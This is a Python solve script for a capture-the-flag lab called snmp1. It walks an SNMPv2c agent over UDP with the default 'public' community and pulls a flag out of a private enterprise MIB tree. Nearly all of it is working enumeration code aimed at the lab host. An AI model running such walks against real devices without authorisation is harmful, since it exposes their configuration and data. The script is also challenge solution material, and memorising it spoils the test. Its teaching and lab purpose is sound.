#!/usr/bin/env python3
"""Reference exploit for snmp1 (SNMP information leak).

The lab host runs an SNMPv2c agent on UDP 161 with the default ``public``
community. It is world-readable: a ``snmpwalk`` returns standard MIB-II host
info AND a private enterprise tree (``1.3.6.1.4.1.99999.*``) whose first node
is the output of a status script -- the flag. Walk the tree, read the flag.

    python solve.py                     # 127.0.0.1:8024
    python solve.py snmp1.chal.deti:8024
    python solve.py 10.0.0.5 8024
    BASE=host:port python solve.py
"""
from __future__ import annotations

import os
import re
import socket
import sys
import time

# The wire codec lives with the agent; reuse it so the exploit speaks exactly
# what the agent answers.
sys.path.insert(
    0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "app"))
import snmpcodec as c  # noqa: E402

COMMUNITY = b"public"
START_OID = "1.3.6.1.2.1.1.1.0"  # sysDescr -- top of the MIB-II system group
MAX_WALK = 1000


def parse_target():
    if len(sys.argv) >= 3:
        return sys.argv[1], int(sys.argv[2])
    t = sys.argv[1] if len(sys.argv) == 2 else os.environ.get(
        "BASE", "127.0.0.1:8024")
    t = re.sub(r"^[a-z+]+://", "", t)
    if ":" in t:
        host, port = t.rsplit(":", 1)
        return host, int(port)
    return t, 8024


def exchange(sock, target, reqid, builder):
    """Send one request, wait for the RESPONSE that matches ``reqid``."""
    sock.sendto(builder(reqid), target)
    deadline = time.time() + 5
    while time.time() < deadline:
        try:
            data, _ = sock.recvfrom(65536)
        except socket.timeout:
            continue
        try:
            r = c.parse_message(data)
        except Exception:
            continue
        if r.get("reqid") == reqid and r.get("pdu_tag") == c.RESPONSE:
            return r
    return None


def main() -> int:
    host, port = parse_target()
    target = (host, port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)

    # 1) wait for the agent to answer (GETNEXT sysDescr until we get a reply)
    reqid = 1
    up = False
    for _ in range(30):
        r = exchange(sock, target, reqid,
                     lambda rid: c.build_getnext(rid, [START_OID], COMMUNITY))
        if r:
            up = True
            break
        reqid += 1
        time.sleep(1)
    if not up:
        sys.stderr.write(f"agent not answering on {host}:{port}\n")
        return 1

    # 2) snmpwalk: GETNEXT from sysDescr until endOfMibView
    cur = START_OID
    reqid = 100
    values = []
    for _ in range(MAX_WALK):
        r = exchange(sock, target, reqid,
                     lambda rid, cur=cur: c.build_getnext(rid, [cur], COMMUNITY))
        reqid += 1
        if not r or not r["bindings"]:
            break
        oid, vtag, vcontent = r["bindings"][0]
        kind, val = c.dec_value(vtag, vcontent)
        if kind == "endofmib":
            break
        values.append((oid, kind, val))
        if oid == cur:  # no progress -> stop
            break
        cur = oid

    # 3) the flag is an OCTET STRING somewhere in the tree (the private node)
    blob = "\n".join(str(v) for _, k, v in values if v is not None and k == "str")
    m = re.search(r"flag\{[^}]+\}", blob)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag in walk ({len(values)} oids)\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
